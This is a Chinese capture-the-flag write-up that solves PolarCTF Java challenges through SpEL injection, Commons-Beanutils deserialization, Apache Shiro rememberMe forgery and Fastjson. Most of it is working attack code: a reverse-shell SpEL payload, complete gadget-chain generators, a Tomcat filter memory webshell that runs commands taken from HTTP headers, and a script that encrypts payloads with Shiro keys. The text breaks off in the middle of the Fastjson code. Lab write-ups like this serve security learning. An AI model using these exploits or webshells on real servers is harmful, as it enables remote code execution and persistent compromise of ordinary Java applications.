---
title: PolarCTF靶场JAVA题全解
---

*作者：Narcher*	*时间：2024/8/25*	*分类：writeup*

<!--more-->

### ezjava

题目提示flag在/app/flag.txt里，下完附件打开看一下

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240825193737254.png" alt="image-20240825193737254" style="zoom:67%;" />

一眼SPEL表达式注入，直接打shell反弹：`T(java.lang.Runtime).getRuntime().exec("bash -c {echo,xxxxxxxxxxxxxxxxxxx}|{base64,-d}|{bash,-i}")`

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240825194455221.png" alt="image-20240825194455221" style="zoom: 50%;" />

结果发现机子不出网，于是只能改成直接读flag了：`new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(new String[]{"bash","-c","cat /app/flag.txt"}).start().getInputStream(), "gbk")).readLine()`

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240825194646805.png" alt="image-20240825194646805" style="zoom:50%;" />



### CB链

下边是Controller

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240825195945414.png" alt="image-20240825195945414" style="zoom: 67%;" />

反序列化也没有什么过滤，但直接打CB链的话会发现机子不出网，因此只能打内存马（网上有些人写反弹shell成功的，不清楚怎么搞得，可能比赛的时候和靶场里的环境不一样？？？）

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240825201119420.png" alt="image-20240825201119420" style="zoom: 50%;" />

但直接打传统的内存马会发现打不进去，应该是payload太长了，被tomcat限制住了，下面学习一下官方的绕过手法

下边这个就是个纯的CB依赖打法的链子：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class EXP {
    public static void main(String[] args) throws Exception {

        final TemplatesImpl templates = createTemplatesImpl(MyClassLoader.class);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(queue);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(bytes));
    }

    public static <T> T createTemplatesImpl(Class c) throws Exception {
        Class<T> tplClass = null;
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = (Class<T>) Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        } else {
            tplClass = (Class<T>) TemplatesImpl.class;
        }
        final T templates = tplClass.newInstance();
        final byte[] classBytes = classAsBytes(c);

        setFieldValue(templates, "_bytecodes", new byte[][]{
                classBytes
        });
        setFieldValue(templates, "_name", "Pwnr");
        return templates;
    }
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        classField.set(obj, fieldValue);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Class<?> clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        return classField.get(obj);
    }

    public static byte[] classAsBytes(final Class<?> clazz) {
        try {
            final byte[] buffer = new byte[1024];
            final String file = classAsFile(clazz);
            final InputStream in = clazz.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            }
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            return out.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static String classAsFile(final Class<?> clazz) {
        return classAsFile(clazz, true);
    }

    public static String classAsFile(final Class<?> clazz, boolean suffix) {
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
        }
        if (suffix) {
            str += ".class";
        }
        return str;
    }
}
```

其中MyClassLoader类内容如下：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.util.Base64;

public class MyClassLoader extends AbstractTranslet {
    static{
        try{
            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();
            java.lang.reflect.Field r=request.getClass().getDeclaredField("request");
            r.setAccessible(true);
            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();
            javax.servlet.http.HttpSession session = request.getSession();

            String classData=request.getParameter("classData");
            System.out.println("classData:"+classData);

            byte[] classBytes = Base64.getDecoder().decode(classData);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
            defineClassMethod.setAccessible(true);
            Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length);
            cc.newInstance().equals(new Object[]{request,response,session});
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
    }
    public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {
    }
}
```

大体意思就是获取请求之后，加载classData传进来的类，并把请求会话这种直接当作参数传给内存马

在传参user=EXP的输出(URL编码)的同时，传参classData=下边内存马的base64编码(同样也urlencode了一下)：

```java
import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.stream.Collectors;

public class FilterMem implements javax.servlet.Filter{
    private javax.servlet.http.HttpServletRequest request = null;
    private org.apache.catalina.connector.Response response = null;
    private javax.servlet.http.HttpSession session =null;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    public void destroy() {}
    @Override
    public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException {
        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;
        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;
        javax.servlet.http.HttpSession session = request.getSession();
        String cmd = request.getHeader("Polar-CMD");
        System.out.println(cmd);
        if (cmd != null) {
            //System.out.println("1");
            response.setHeader("Polar-START", "OK");
            // 使用 ProcessBuilder 执行命令
            Process process = new ProcessBuilder(cmd.split("\\s+"))
                    .redirectErrorStream(true)
                    .start();
            //System.out.println("2");
            // 获取命令执行的输入流
            InputStream inputStream = process.getInputStream();

            // 使用 Java 8 Stream 将输入流转换为字符串
            String result = new BufferedReader(new InputStreamReader(inputStream))
                    .lines()
                    .collect(Collectors.joining(System.lineSeparator()));
            System.out.println("3");
            response.setHeader("Polar-RESULT",result);
        } else {
            filterChain.doFilter(request, response);
        }
    }
    public boolean equals(Object obj) {
        Object[] context=(Object[]) obj;
        this.session = (javax.servlet.http.HttpSession ) context[2];
        this.response = (org.apache.catalina.connector.Response) context[1];
        this.request = (javax.servlet.http.HttpServletRequest) context[0];
        try {
            dynamicAddFilter(new FilterMem(),"Shell","/*",request);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return true;
    }
    public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {
        javax.servlet.ServletContext servletContext=request.getServletContext();
        if (servletContext.getFilterRegistration(name) == null) {
            java.lang.reflect.Field contextField = null;
            org.apache.catalina.core.ApplicationContext applicationContext =null;
            org.apache.catalina.core.StandardContext standardContext=null;
            java.lang.reflect.Field stateField=null;
            javax.servlet.FilterRegistration.Dynamic filterRegistration =null;
            try {
                contextField=servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
                contextField=applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(name, filter);
                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{url});
                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, null);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }catch (Exception e){
            }finally {
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }
        }
    }
}
```

上边这个就是个普通的tomcat的filter内存马

为了方便截图我把user的内容删了一部分，下边的图仅是传参示例：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240825213432724.png" alt="image-20240825213432724" style="zoom:50%;" />

之后从HTTP header中设置命令就好了：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240825213508956.png" alt="image-20240825213508956" style="zoom: 50%;" />



### PolarOA

进去是个登录框

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240826111920851.png" alt="image-20240826111920851" style="zoom:50%;" />

随便输一输抓包看看：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240826111956332.png" alt="image-20240826111956332" style="zoom:50%;" />

一眼shiro

直接上工具梭哈

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240826112108802.png" alt="image-20240826112108802" style="zoom: 50%;" />

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240826112153926.png" alt="image-20240826112153926" style="zoom:50%;" />

构造链这里似乎爆破的有点问题，有点怪，爆破不出来，还不给源码，我怎么知道CB依赖是什么版本的，下边是出题人的解释：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240826112525276.png" alt="image-20240826112525276" style="zoom:67%;" />

之后我去看了看之前自己搭的shiro 1.2.4的版本，发现确实自带的CB依赖就是1.8.3版本的，可能是个小trick吧，那么打纯CB依赖就好了，上边CB链那个题先拿过来试一试，发现也是长了，那就先打一下出网吧，结果打完发现不出网

先把马贴出来吧：

```java
package shiropoc;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;

import java.io.IOException;

public class DynamicClassGenerator {
    public CtClass genPayloadForWin() throws NotFoundException, CannotCompileException, IOException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("Exp");

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public SpringEcho() throws Exception {\n" +
                "            try {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "\n" +
                "                String te = httprequest.getHeader(\"Host\");\n" +
                "                httpresponse.addHeader(\"Host\", te);\n" +
                "                String tc = httprequest.getHeader(\"CMD\");\n" +
                "                if (tc != null && !tc.isEmpty()) {\n" +
                "                    String[] cmd = new String[]{\"cmd.exe\", \"/c\", tc};  \n" +
                "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                    httpresponse.getWriter().write(new String(result));\n" +
                "\n" +
                "                }\n" +
                "                httpresponse.getWriter().flush();\n" +
                "                httpresponse.getWriter().close();\n" +
                "            } catch (Exception e) {\n" +
                "                e.getStackTrace();\n" +
                "            }\n" +
                "        }", clazz));

        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }
    public CtClass genPayloadForLinux() throws NotFoundException, CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("Exp");

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public SpringEcho() throws Exception {\n" +
                "            try {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "\n" +
                "                String te = httprequest.getHeader(\"Host\");\n" +
                "                httpresponse.addHeader(\"Host\", te);\n" +
                "                String tc = httprequest.getHeader(\"CMD\");\n" +
                "                if (tc != null && !tc.isEmpty()) {\n" +
                "                    String[] cmd =  new String[]{\"/bin/sh\", \"-c\", tc};\n" +
                "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                    httpresponse.getWriter().write(new String(result));\n" +
                "\n" +
                "                }\n" +
                "                httpresponse.getWriter().flush();\n" +
                "                httpresponse.getWriter().close();\n" +
                "            }\n" +
                "        }", clazz));

        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }
}
```

然后是纯CB依赖的链子：

```java
package shiropoc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

//shiro无依赖利用链，使用shiro1.2.4自带的cb 1.8.3
public class POC {
    public static void main(String[] args) throws Exception {
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate();

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        // ==================
        // 生成序列化字符串
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\shiro_CB.txt"));
        oos.writeObject(queue);
    }
    public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception {
        DynamicClassGenerator classGenerator =new DynamicClassGenerator();
        CtClass clz = classGenerator.genPayloadForLinux();
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        return obj;
    }
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        classField.set(obj, fieldValue);
    }
}
```

因为懒得配shiro环境了，直接用之前的python脚本给AES加密了：

```python
import uuid
import base64
from Crypto.Cipher import AES

def encode_rememberme():
    f = open('C:\\Users\\Narcher\\IdeaProjects\\shiro_CB.txt','rb')
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==") #密钥
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(f.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    payload = encode_rememberme()    
    print("rememberMe={0}".format(payload.decode()))
```

以上的流程走完我们就可以直接打了，因为是动态的，所以直接从HTTP header中添加CMD然后命令执行就好了

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240826140836266.png" alt="image-20240826140836266" style="zoom: 50%;" />

上边的流程走完，我们会发现rememberMe的长度在3300以内，当然是符合题目要求的，然而， 我们还可以对链子再次缩减（这里偷学p0lar1ght师傅的博客[rwctf_Old-shiro题解 | P0l@R19ht (p0lar1ght.github.io)](https://p0lar1ght.github.io/posts/rwctf-Old-shiro_WP/)），缩减后的链子长度大约在2800以内

```java
package shiropoc;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class POC_short {
    public static void main(String[] args) throws Exception {
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate();

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        // ==================
        // 生成序列化字符串
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\shiro_CB.txt"));
        oos.writeObject(queue);
    }

    public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("A");
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public B() throws Exception {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "                String[] cmd =  new String[]{\"sh\", \"-c\", httprequest.getHeader(\"C\")};\n" +
                "                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                httpresponse.getWriter().write(new String(result));\n" +
                "                httpresponse.getWriter().flush();\n" +
                "                httpresponse.getWriter().close();\n" +
                "        }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }

    public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception {

        CtClass clz = genPayloadForLinux();
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        return obj;
    }
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        classField.set(obj, fieldValue);
    }
}
```

我们来对比一下缩减前后的差距，其实和上边比起来就是少了个类的引用，但和正常的继承AbstractTranslet类的比起来，少了很多类的引用（正常继承会强制重写一些方法导致增加字符）

虽然这个payload短了不少，但拿去打上边那个叫CB链的题是不行的，因为打完链子就直接报500错误了，看不到回显，如果再添上内存马，那么payload又长了，还是不行的



### PolarOA2.0

这个题是上边那个题的升级版，密钥不再是默认的那个了，下边有两种方法来获取密钥，我们都来看一看

方法一：直接爆破常见密钥

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240826160344519.png" alt="image-20240826160344519" style="zoom:50%;" />

不过这里有个问题，那就是不知道shiro的版本，shiro在1.4.2版本之后增加了AES GCM加密，因此不确定应不应该勾选，那就先都爆破一遍看看

（这里很奇怪，之前我打开的时候，确实是上边爆破出来了的，但之后直到爆破结束也没爆破出来，可能之前是误报，因为出题人也说这题是爆不出来的，那我们就直接看下边这种方法了）

方法二：爆破用户名和密码

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901131310956.png" alt="image-20240901131310956" style="zoom:50%;" />

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901130731006.png" alt="image-20240901130731006" style="zoom:50%;" />



直接弱口令`admin:admin123`登录

***特性：Shiro大于1.2.4的版本中，在没有开发人员人工干预的情况下key改为了随机生成，这个随机生成是在每次启动Web环境的时候，重启前这个key不会改变，可以在JVM虚拟机内存里找到，而Spring的heapdump文件就是从JVM虚拟机内存导出的。***

因此我们可以尝试从`/actuator/heapdump`看看有没有文件泄露，结果发现还真有，那就下载下来分析一波：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901132901688.png" alt="image-20240901132901688" style="zoom:50%;" />

除此之外，发现直接读`/actuator/env`就能发现flag：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901133111365.png" alt="image-20240901133111365" style="zoom:50%;" />

尝试交了一遍发现是个假flag。。。。那就只能继续往下做了，先验证一下key：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901134030982.png" alt="image-20240901134030982" style="zoom: 50%;" />

本题的key是`FBLIB5s/7pnNDrYGF3+1og==`，当然肯定是每个容器都不一样，还是自己尝试一下吧

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901134143667.png" alt="image-20240901134143667" style="zoom: 67%;" />

之后出题人说要用payload在3000以内的，那我们就直接把上边PolarOA那个缩短版拿过来就好了：

```java
package shiropoc;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class POC_aesgcm_short {
    public static void main(String[] args) throws Exception {
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate();

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(queue);
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode(CodecSupport.toBytes("HeWlhWC2OauL4D1HjGqHDw=="));//shiro密钥
        byte[] bytes = byteArrayOutputStream.toByteArray();
        System.out.println(aes.encrypt(bytes, key));
    }

    public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("A");
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public B() throws Exception {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "                String[] cmd =  new String[]{\"sh\", \"-c\", httprequest.getHeader(\"C\")};\n" +
                "                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                httpresponse.getWriter().write(new String(result));\n" +
                "                httpresponse.getWriter().flush();\n" +
                "                httpresponse.getWriter().close();\n" +
                "        }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }

    public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception {

        CtClass clz = genPayloadForLinux();
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clz.toBytecode()});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        return obj;
    }
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        classField.set(obj, fieldValue);
    }
}
```

但这里再往后就牵扯到一个版本问题了，从`/actuator/logfile`能够发现其shiro版本为1.8.0：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901161849598.png" alt="image-20240901161849598" style="zoom:67%;" />

除此之外我们还需要知道CB依赖的版本，不然就会报错，经过搜索shiro1.8.0对应的CB依赖版本是1.9.4，然后打就完了：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901162500714.png" alt="image-20240901162500714" style="zoom:50%;" />

（本题我在网上看了看，除了出题人的WP之外就没有了，里边写的时候也没提到版本问题，当时做的时候就卡在这里动不了了，还好想起来了版本的事情...）



### Fastjson

打开题目一看是这个：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901164016150.png" alt="image-20240901164016150" style="zoom:67%;" />

看一下源码：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901164233797.png" alt="image-20240901164233797" style="zoom: 67%;" />

再看一下fastjson的版本：

<img src="PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/image-20240901164330635.png" alt="image-20240901164330635" style="zoom:67%;" />

看起来就一个简单的fastjson漏洞的利用，连个过滤都没有，因为题目不出网，我们用TemplatesImpl打就完了：

```java
package fastjson;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;
import java.io.IOException;

public class Test {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
        CtClass clz = genPayloadForLinux();
        String byteCode = java.util.Base64.getEncoder().encodeToString(clz.toBytecode());
        //构造TemplatesImpl的json数据，并将恶意类注入到json数据中
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String payload = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+byteCode+"\"]," +
                "'_name':'TempletaPoc'," +
